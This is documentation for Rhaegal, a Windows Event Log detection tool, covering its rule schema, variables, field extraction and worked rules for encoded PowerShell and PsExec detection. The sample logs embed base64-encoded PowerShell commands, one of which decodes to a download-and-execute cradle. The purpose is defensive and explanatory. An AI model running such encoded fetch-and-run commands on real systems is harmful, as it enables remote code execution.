# Creating Rules

In this section we will learn how to create Rhaegal rule. There is two type of Rhaegal rules:

* Public Rule : This is a basic rule that search is for basic search in each record in the Windows Event Log. For example searching for the EventID (EID) `4624` in the `Security` channel with the login type `9`.
* Private Rule: This type of rule are written exactly  like the public rules, However they will not be searched through logs until a public rule calls it. This type of rules allow you to search multiple records for a combination of conditions. For example you can create the following rules:
  * A private rule that select the EID `4624` with the login type `3` in the `security` log.
  * A private rule that select the EID `7045` with the service name contains remote execution service name such as `PSEXESVC` in the `system` log.
  * A public rule that trigger only if the above rule are triggered with in `X` milliseconds.

You probable can see the potential of using the private rule, However nothing perfect. The private rules takes considerably more time to process that the public rules, So I will recommend to use private rule if you can not accomplish what you want with the public rules or you do not care about the time the rule takes :)



# Rule Schema

In this section I will explain the schema of Rhaegal rules. Here is an example of Rhaegal rule:

```yaml
public PTHAttack
{
    metadata:
      author: "AbdulRhman Alfaifi"
      reference: "Init Rules"
      creationDate: "17/10/2019"
      score: 80
      description: "Pass the Hash was detected"
    Channel: "Security"
    include:
      EventID: "4624"
      Data.LogonType: "9"
      Data.LogonProcessName: "seclogo"
    exclude:
      Data.TargetUserName: "ANONYMOUS LOGON"
}
```

The rule consists of two main parts:

* Declaration : The declaration contains two parts, The `Rule Type` which could be `Public` or `Private` and `Rule Name` which is the name of the rule. The name should only printable ASCII characters except space and `-`.
* Rule Body : The rule body contains three main sections and the channel field. And they are as follows:
  * metadata: this section contains some information about the rule. The following fields can be added to this section:
    * author: This field contains the person who wrote this rule.
    * reference:  This field contains reference about the rule such as a URL for an article that shows more info about what you are trying to detect. 
    * creationDate: The data of the rule creation.
    * score: an integer representing the severity of the rule. This should be a number from `0` to `100`
    * description: A text descripting what you trying to detect.
  * Channel: This field is required. This is the name of the log you what to search in. For this example I am looking for the EID `4624` which is in the `Security.evtx` log. Tis field also accepts wildcard.
  * include: This field is a list of fidelis that will get searched on each record. Each field inside this field could be a single value or a list of values.
  * exclude *(optional)* : This field is a list of fidelis that will get excluded from the search. Each field inside this field could be a single value or a list of values.
  * modifiers *(optional)* : A list of logical and regex checks the event fields. The following is the supported modifiers:
  
    * logical operations (<,>,<=,>=) which will check the length of the field. For example `Data.ServiceName <= 6` will check the length of the field named `Data.ServiceName` if it is less than or equal to `6`
    * regex check on the event field. For example `Data.ServiceName $rex ([a-zA-Z0-9]){10}` will check if the field `Data.ServiceName` is `10` characters in length and it only contains letters and numbers.
    * String search on all of the events by using the syntax `Search [$str|$rex] <YOUR_SEARCH_STRING>`. If you choose `$str` then a string search will be used but with `$rex` option you can use regex. String search also supports wild cards and varibales. 
  * returns *(optional)*: A list of fields to be returned if the rule got triggered. If this is not provided the raw event data will be returned.

# Variables 

Rhaegal support variables to be passes instead of constants. Variables starts with `$` and can be used on every field. Here is a list of variables:

* `$IP` : This variable will be evaluated at runtime to the IPv4 of the machine including the loop back IP. If there is multiple IPs the rule will check all of them. For example here is a rule to detect RDP tunneling:

  ```yaml
  public RDP_over_Reverse_SSH_Tunnel_WFP 
  {
      metadata:
        author: Samir Bousseaden
        reference: https://twitter.com/SBousseaden/status/1096148422984384514
        creationDate: 2019/02/16
        score: 80
        description: Detects svchost hosting RDP termsvcs communicating with the loopback address and on TCP port 3389
      Channel: Security
      include:
        EventID: '5156'
        Data.SourcePort: '3389'
        Data.DestinationAddress: $IP
        Data.DestinationPort: '3389'
        Data.SourceAddress: $IP
  }
  ```

  As you can see instead of using the loop back address we used `$IP` to trigger for all IPs assigned to the endpoint.

* `$<FIELD_NAME>` : In this type of variable you can reverence fields to be check on another field. For example here is the same rule as above but using this variable:

  ```yaml
  public RDP_over_Reverse_SSH_Tunnel_WFP 
  {
      metadata:
        author: Samir Bousseaden
        reference: https://twitter.com/SBousseaden/status/1096148422984384514
        creationDate: 2019/02/16
        score: 80
        description: Detects svchost hosting RDP termsvcs communicating with the loopback address and on TCP port 3389
      Channel: Security
      include:
        EventID: '5156'
        Data.SourcePort: '3389'
        Data.DestinationPort: '3389'
        Data.SourceAddress: $Data.DestinationAddress
  }
  ```

* `$<ENV>` : This type of variables allow you to reverence an environment variable. For example if you want to reverence the `COMPUTERNAME` environment variable all you need to do is to prepend `$` to the environment variable name so it will look like this `$COMPUTERNAME`

# How Rhaegal Extracts The Events Fields ?

Rhaegal parses all events to dictionary. Let's take the following event as an example:

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" /> 
      <EventID Qualifiers="0">403</EventID> 
      <Level>4</Level> 
      <Task>4</Task> 
      <Keywords>0x80000000000000</Keywords> 
      <TimeCreated SystemTime="2019-10-25T20:26:35.737437000Z" /> 
      <EventRecordID>353</EventRecordID> 
      <Channel>Windows PowerShell</Channel> 
      <Computer>LAB-PC</Computer> 
      <Security /> 
    </System>
	<EventData>
 	  	<Data>Stopped</Data> 
      	<Data>Available</Data> 
      	<Data>NewEngineState=Stopped PreviousEngineState=Available SequenceNumber=15 HostName=ConsoleHost HostVersion=5.1.18362.145 HostId=9acf0149-61aa-419e-9ac2-ef336a40a31a HostApplication=powershell -ep bypass -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7AEkARQBYACAAJABjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMgA3AC4AMAAuADAALgAxADoAOAAwADAAMAAvAHMAIgApAA== EngineVersion=5.1.18362.145 RunspaceId=c5d60be5-441d-408a-9e17-36084284756d PipelineId= CommandName= CommandType= ScriptName= CommandPath= CommandLine=</Data> 
	</EventData>
</Event>
```

Rhaegal parses all the data from the event. Here how you can reference a field:

* If the field is a `text` like the `EventID` then basically the key is `EventID` unless there is an attribute called `Name` then you would use `<TAG_NAME>.<NAME_ATTRIBUTE_VALUE>`
* If the field is an attribute then you can reference it using `<TAG_NAME>.<ATTRIBUTE_NAME>`. for example if you want to reference the `SystemTime` attribute in the `TimeCreated` tag then you would use `TimeCreated.SystemTime`
* Finally if you want to reference a field that repeats multiple times such as the `Data` tag inside `EventData` section you would use `Data0` for the first child, `Data1` for the second and so on

# Public Rule Example

In this section we will be writing a Rhaegal public rule to detect PowerShell encoded command. The following is an example of malicious activities that was logged in the `Windows PowerShell` log file:

```xml
<?xml version="1.0" encoding="utf-16"?>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="PowerShell" />
    <EventID Qualifiers="0">600</EventID>
    <Level>4</Level>
    <Task>6</Task>
    <Keywords>0x80000000000000</Keywords>
    <TimeCreated SystemTime="2019-12-24T16:46:45.739578100Z" />
    <EventRecordID>1337</EventRecordID>
    <Channel>Windows PowerShell</Channel>
    <Computer>LAB-PC</Computer>
    <Security />
  </System>
  <EventData>
    <Data>Registry</Data>
    <Data>Started</Data>
    <Data>	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.17134.858
	HostId=dcd11215-1a77-44eb-ab30-dc75f100db18
	HostApplication=powershell -ep bypass -e SQBFAFgAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAFMAVQBWAFkASQBDAGgAYgBVADMAbAB6AGQARwBWAHQATABsAFIAbABlAEgAUQB1AFIAVwA1AGoAYgAyAFIAcABiAG0AZABkAE8AagBwAFYAVgBFAFkANABMAGsAZABsAGQARgBOADAAYwBtAGwAdQBaAHkAaABiAFUAMwBsAHoAZABHAFYAdABMAGsATgB2AGIAbgBaAGwAYwBuAFIAZABPAGoAcABHAGMAbQA5AHQAUQBtAEYAegBaAFQAWQAwAFUAMwBSAHkAYQBXADUAbgBLAEMAZABUAFYAVgBaAFoAUwBVAE4AbwBZAGwAVQB6AGIASABwAGsAUgAxAFoAMABUAEcAeABTAGIARwBWAEkAVQBYAFYAUwBWAHoAVgBxAFkAagBKAFMAYwBHAEoAdABaAEcAUgBQAGEAbgBCAFcAVgBrAFYAWgBOAEUAeAByAFoARwB4AGsAUgBrADQAdwBZADIAMQBzAGQAVgBwADUAYQBHAEoAVgBNADIAeAA2AFoARQBkAFcAZABFAHgAcgBUAG4AWgBpAGIAbABwAHMAWQAyADUAUwBaAEUAOQBxAGMARQBkAGoAYgBUAGwAMABVAFcAMQBHAGUAbABwAFUAVwBUAEIAVgBNADEASgA1AFkAVgBjADEAYgBrAHQARABaAEYAUgBXAFYAbABwAGEAVQAxAFYATwBiADEAbABzAFYAWABwAGkAUwBIAEIAcgBVAGoARgBhAE0ARgBSAEgAZQBGAE4AaQBSADEAWgBKAFYAVgBoAFcAVQAxAFoANgBWAG4ARgBaAGEAawBwAFQAWQAwAGQASwBkAEYAcABIAFUAbABCAGgAYgBrAEoAWABWAG0AdABXAFcAawA1AEYAZQBIAEoAYQBSADMAaAByAFUAbQBzADAAZAAxAGsAeQBNAFgATgBrAFYAbgBBADEAWQBVAGQASwBWAGsAMAB5AGUARABaAGEAUgBXAFIAWABaAEUAVgA0AGMAbABSAHUAVwBtAGwAaQBiAEgAQgB6AFcAVABJADEAVQAxAHAARgBPAFgARgBqAFIAVwBSAHEAWQBsAFIAcwBNAEYAVgBYAE0AVQBkAGwAYgBIAEIAVgBWADEAUgBDAFYAawAwAHgAUwBqAFYAWgBWAG0ATQB4AFkAbQB0ADAAUgBGAHAARwBVAGwAZABXAGIASABCAGgAVgBUAEYAVwBUADIASQB4AGIASABOAFcAVwBIAEIAcABVADAAaABDAGMAbABWAHEAUgBtAEYATgBSAGwASgBJAFoAVQBaAE8AYQBWAEkAeABXAGsAcABXAFYAbQBoAFgAVgBUAEYAYQBOAGwAWgB1AFIAbABwAGgAYQAzAEIAVQBXAFQAQgBrAFMAMgBSAEcAYwBFAGgAVgBiAEUASgBvAFkAbQB0AEsAVwBGAFoAdABkAEYAZABYAGEAegBWAEcAWgBVAGgASwBZAFYASQB6AGEASABKAFYAYgBYAE0AdwBaAEQARgByAGUAVQAxAFkAVABtAHQAVwBiAGsARQB4AFcAVgBWAGsAUwAxAFoAcgBNAEgAbABsAFIARgBwAGgAVQBsAGQAUwBXAEYAcABGAFYAagBSAGoAYgBGAEoAMQBWADIAMQBzAGEAVwBKAEkAUQBuAHAAWABWAEUAawB4AFYAVABGAHcAUgBrADkAWQBSAG0AcABTAFYAMQBKAHgAVwBXAHgAUwBjADAAMQBHAFYAbABoAE4AVgBXAFIAcwBZAGsAaABDAFYAbABZAHgAVQBrAE4AVwBhAHoAQgA0AFUAMgBwAFcAVwBsAFoAdABUAFgAaABaAGIAWABRAHcAVQBrAFoAdwBSADEAVgBzAFoARgBkAGkAUwBFAEoAbwBWAGwAUgBHAFYAMQBRAHkAUwBYAGgAaQBTAEUANQBYAFYAMABoAEMAYwBGAFUAdwBhAEUATgBqAGIARgBaAHgAVQBtADEARwBUAGwASgBzAFMAawBsAGEAVgBWAHAAUABZAFYAWgBKAGUARgBkAHIAYwBGAGQAVwBiAFcAaABZAFYAbABSAEcAWQBVADUAcwBXAG4AVgBTAGIASABCAG8AWQBUAE4AQwBWAFYAZABVAFEAbQB0AFQATQBsAEoASABZADAAVgBvAFYAbQBKAEYAUwBtADkAWgBiAFgAUgBMAFYAMABaAGEAZABHAFIARwBaAEYAaABoAGUAbABaAEgAVwBsAFYAbwBTADEAbABXAFMAWABwAGgAUwBFAHAAVwBZAGwAaABOAGQAMQBwAEUAUgBuAEoAbABWAFQARgBaAFYARwAxADAAVgAyAEoAcgBSAFgAaABYAFYAbABaAHIAVQB6AEYAYQBjAGsAMQBJAGIARwB4AFMAUgBuAEIAbwBWAFcAeABrAFUAMQBkAEcAYwBFAFoAVwBhAGwASgBxAFkAawBaAEsATQBWAFkAeQBNAFgATgBoAFYAMABwAEoAVQBXADUAdwBXAEYAWgBGAGEAMwBoAFcAVgBFAFoAMwBVAG0AcwA1AFcAVgBKAHQAYwBGAE4AVwBNAFUAcAA0AFYAMQBkADQAVQAyAE0AdwBNAFUAZABXAGIARwBoAE8AVgBsAGQAUwBjADEAbAByAGEARQBOAFcAYgBGAGwANABWAFcAdABPAFYAMgBGADYAUQBqAFIAVgBNAG4AQgBYAFYAMgB4AGEAZABGAFIAWQBhAEYAcABpAFcARgBGADMAVgBXAHQAYQBkADEASQB4AGMARQBaAE8AVgBUAFYAVQBVAGwAVgBzAE4AbABaAHEAUwBqAEIAVwBNAGsAVgA0AFYAMgA1AFMAVgBtAEUAeQBVAGwAWgBaAFYARQBwAHYAVgBWAFoAWgBkADIARgBGAFQAbQBwAGkAUgBsAHAAVwBWAFYAZAAwAGEAMgBGAHMAUwBuAE4AVwBhAGwASgBYAFUAagBOAFMAVQBGAGwAWABjADMAaABqAGIARwBSAHoAWQBrAGQARwBVADEAWQB4AFIAWABkAFcAVgBFAG8AMABWAEQARgBPAFMARgBaAHIAVgBsAFIAaQBWAFYAcABVAFcAVwB4AGsAYgAxAFIARwBXAFgAbABqAFIAVwBSAHEAWQBsAFoAYQBlAGwAWQB5AE4AVgBkAGgAVgBrAGwANQBZAFUAWgBvAFkAVgBaADYAUgBYAHAAVQBWADMAaAByAFYAagBGAGsAZABFADkAVwBXAGsANQBTAFIAbABwAFkAVgAxAGQAMABWADEAWQB5AFIAbABaAE4AUwBHAFIAVQBZAFQATgBTAFYAMQBsAFgAZABFAHQAVQBSAGwASgBYAFYAMgA1AE8AVgAwADEAWQBRAGsAaABaAE0ARwBSAEgAVgBHADEASwBSADIATgBHAGMARgBkAFMAUgBWAHAAVQBWAFcAcABHAFQAMgBNAHgAVABsAGwAYQBSAG0AaABvAFkAawBaAHcAVwBsAGQAWABkAEYAWgBOAFYAawBwAEgAWQBUAE4AawBZAFYASgBZAFUAbgBKAFcAYgBYAGgAaABUAFUAWgB3AFYAbABwAEkAWgBHAGgAVwBiAEgAQgA2AFcAVwA1AHcAUwAxAGQASABSAFgAaABYAGIAawBwAFgAWQBXAHQAdwBSADEAcABFAFMAawB0AFMAYgBVAFoASABVAFcAeABvAFUAMgBKAEkAUQBrADEAVwBiAEYASgBEAFkAVABGAFYAZAAwADEAWQBUAG0AaABOAE0AbgBoAFAAVgBtAHQAVwBTADIATgBXAFYAbgBGAFIAYgBtAFIATwBVAG0AMQBTAFYAbABVAHkATQBUAEIAaABSAGwAcABWAFUAbQA1AG8AVgAxAFoANgBRAFgAaABYAFYAbABwAEwAVgAwAFoAVwBkAFYAZABzAGMARQA1AFMATQBVAHAAUgBWAGsAZAA0AFkAVgBJAHkAVQBsAGQAagBSAFcAaABxAFUAagBKADQAVwBGAFYAcQBUAG0ANQBOAFIAbABwAHgAVQAyAHAAUwBhAEUAMQBXAFIAagBOAFUAVgBsAFoAaABZAFYAWgBLAFcARwBGAEcAVwBsAHAAaQBXAEcAZwB6AFcAVABCAGEAYwAyAFIASABWAGsAWgBrAFIAMgB4AE8AVgBqAEYASwBWADEAWgByAFoARABSAFQATQBXAHgAVwBUAFYAaABLAGEAbABKAHQAZQBGAGgAWgBhADIAUgBUAFkAMgB4AHMAVgAxAFoAWQBhAEcAcABXAGIARgBvAHcAVgBHAHgAawBSADEAVQB4AFcAWABsAGgAUwBHAHgAWQBWAGsAVgBLAGMAbABaAFUAUgBrADkAVwBNAFYAcAAxAFYAVwAxADQAVQAwADAAdwBTAG4AWgBXAGIAWABoAFgAWgBEAEYARgBlAEYAZABzAFoARgBoAGkAUwBFAEoAUQBWAG0AMAAxAFEAMgBWAHMAVgBuAFIAbABSADAAWgBwAFUAbQB0AHcAVwBWAFoAWABlAEUAOQBXAE0AawBwAEkAVgBWAFIAQwBWAGsAMQBHAGMARgBkAGEAVgBWAHAAVABZADIAMQBPAFIAMQBKAHMAVwBrADUAaABlAGwAVgA2AFYAbABoAHcAUgAxAFEAeQBUAG4ATgBSAGIARgBKAGEAVABUAEIASwBUAFYAWgBVAFMAbgBwAFAAVgBYAEEAMQBZAFQATgBDAFQARgBWAFUATQBEAGwASwBlAFcAdAB3AFMAMQBFADkAUABTAGMAcABLAFMAawA9ACcAKQApACkA
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=</Data>
  </EventData>
</Event>
```

The following is a rule to detect this type of logs:

```yaml
public EncodedPowershellCommand
{
    metadata:
      author: "AbdulRhman Alfaifi"
      reference: "https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/About/about_PowerShell_exe?view=powershell-5.1#-encodedcommand-base64encodedcommand"
      creationDate: "20/10/2019"
      score: 90
      description: "Encoded PowerShell Command"
    Channel: "Windows PowerShell"
    include:
      EventID: 
      - "403"
      - "400"
      - "600"
      Data2:
      - "* -e*"
      - "* bypass *"
}
```

Let's break down the above rule:

* First, the type of the rule is public.
* Then the name of the rule. In this rule I named it `EncodedPowershellCommand`
* Inside the body we have metadata,channel and include
* The `metadata` have some information about the rule and who created it and so on.
* The `channel` field contains the log file that this rule apples to.
* The `include` field contains two entries, And they are as follows:
  * EventID: This is the text inside the `EventID` tag in the event above.
  * Data2: This is the third (index start at 0 , as it should be ...) child of the `EventData` tag which contains the detailed log information. Here I am searching for `-e` argument and `bypass` keyword (might give you false positive, depending on your environment) . The `*` is a wildcard match, which means any character.

If you tried to execute Rhaegal with this rule on the `Windows PowerShell` using the command :

`python3 rhaegal.py -l "Windows PowerShell.evtx" -r rules/EncodedPowershell.gh`

here is the results:

```CSV
"2019-10-26 00:13:25.647778","1","EncodedPowershellCommand",90,"Encoded PowerShell Command","https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/About/about_PowerShell_exe?view=powershell-5.1#-encodedcommand-base64encodedcommand","['600']","<EVENT_XML>"
```

It worked ! Noice. Now let's go to the private rules.

# Private Rule Example

This this section I will make a private rules that get triggered by a public rule. Basically a private rule is useless until it gets called by a public rule. In This example we will write rules to detect the remote execution `PsExec` . Here is two event that gets logged in relatively the same time on the destination system. This one is from the security log:

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
<System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
  <EventID>4624</EventID> 
  <Version>0</Version> 
  <Level>0</Level> 
  <Task>12544</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2019-10-25T22:25:44.642161700Z" /> 
  <EventRecordID>9165</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="544" ThreadID="1096" /> 
  <Channel>Security</Channel> 
  <Computer>LAB-PC</Computer> 
  <Security /> 
  </System>
<EventData>
  <Data Name="SubjectUserSid">S-1-0-0</Data> 
  <Data Name="SubjectUserName">-</Data> 
  <Data Name="SubjectDomainName">-</Data> 
  <Data Name="SubjectLogonId">0x0</Data> 
  <Data Name="TargetUserSid">S-1-5-21-1473577449-155250460-3656573160-1000</Data> 
  <Data Name="TargetUserName">Lab</Data> 
  <Data Name="TargetDomainName">LAB-PC</Data>
  <Data Name="TargetLogonId">0x2424d2</Data> 
  <Data Name="LogonType">3</Data> 
  <Data Name="LogonProcessName">NtLmSsp</Data> 
  <Data Name="AuthenticationPackageName">NTLM</Data> 
  <Data Name="WorkstationName">ABDULRHMAN-PC</Data> 
  <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data> 
  <Data Name="TransmittedServices">-</Data> 
  <Data Name="LmPackageName">NTLM V2</Data> 
  <Data Name="KeyLength">128</Data> 
  <Data Name="ProcessId">0x0</Data> 
  <Data Name="ProcessName">-</Data> 
  <Data Name="IpAddress">192.168.100.2</Data> 
  <Data Name="IpPort">7458</Data> 
  </EventData>
  </Event>
```

And this is the log from the `System` log:

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
<System>
  <Provider Name="Service Control Manager" Guid="{555908d1-a6d7-4695-8e1e-26931d2012f4}" EventSourceName="Service Control Manager" /> 
  <EventID Qualifiers="16384">7045</EventID> 
  <Version>0</Version> 
  <Level>4</Level> 
  <Task>0</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8080000000000000</Keywords> 
  <TimeCreated SystemTime="2019-10-25T22:25:44.673361700Z" /> 
  <EventRecordID>8281</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="536" ThreadID="124" /> 
  <Channel>System</Channel> 
  <Computer>LAB-PC</Computer> 
  <Security UserID="S-1-5-21-1473577449-155250460-3656573160-1000" /> 
  </System>
<EventData>
  <Data Name="ServiceName">PSEXESVC</Data> 
  <Data Name="ImagePath">%SystemRoot%\PSEXESVC.exe</Data> 
  <Data Name="ServiceType">user mode service</Data> 
  <Data Name="StartType">demand start</Data> 
  <Data Name="AccountName">LocalSystem</Data> 
  </EventData>
  </Event>
```

Here is the rules to detect this behavior:

```yaml
public DetectPsExec
{
    metadata:
      author: "AbdulRhman Alfaifi"
      reference: "N/A"
      creationDate: "20/10/2019"
      score: 50
      description: "PsExec Execution Detected"
    include:
      rule:
      - "LoginType3"
      - "PsExecSeriveInstalled"
      if:
        within: 100
}


private LoginType3
{
    metadata:
      author: "AbdulRhman Alfaifi"
      reference: "N/A"
      creationDate: "20/10/2019"
      description: "Login type 3"
    Channel: "Security"
    include:
      EventID: "4624"
      Data.LogonType: "3"
}

private PsExecSeriveInstalled
{
    metadata:
      author: "AbdulRhman Alfaifi"
      reference: "N/A"
      creationDate: "20/10/2019"
      description: "PsExec Service (PSEXESVC) Installed"
    Channel: "System"
    include:
      EventID: "7045"
      Data.ServiceName: "*PSEXESVC*"
}
```

You can see that there are three rules, two of them are private rules and the last one is a public rule that call the private rules. You can see that the private rule schema is identical to the public rules above, However the public rule that wraps the private rules is a little deferent. The following is an explanation for each rule:

*  LoginType3 : Is the rule responsible to detect the login type 3 in the `Security` log.
* PsExecSeriveInstalled : is responsible to detect the service install call `PSEXESVC` in the `System` log
*  DetectPsExec : Is the public rule that wraps the private rules. This public rule is little deferent that other public rules, Here are the deference between a normal public rule and a public rule that wraps private rules:
  * The `channel` field is not required (if provided it will be ignored).
  * It does not have `exclude` field.
  * The`include` field contains only two field `rule` and `if`. The`rule` field contains a list of rule names and the `if` field contains one field called `within` that contains a value that represent the time frame between the events that are triggered by the private rules in milliseconds.

Let's test these rules using the command:

`python3 rhaegal.py -lp ./logs -r rules/DetectPsExec.gh`

The results for the above command is:

```
"2019-10-26 02:18:21.391807","['9165', '8281']","DetectPsExec",50,"PsExec Execution Detected","N/A","","<EVENTS_DATA>"
```

Notice the second CSV field is `['9165', '8281']` which is a list of `EventRecordIDs` for the events that satisfy the rule.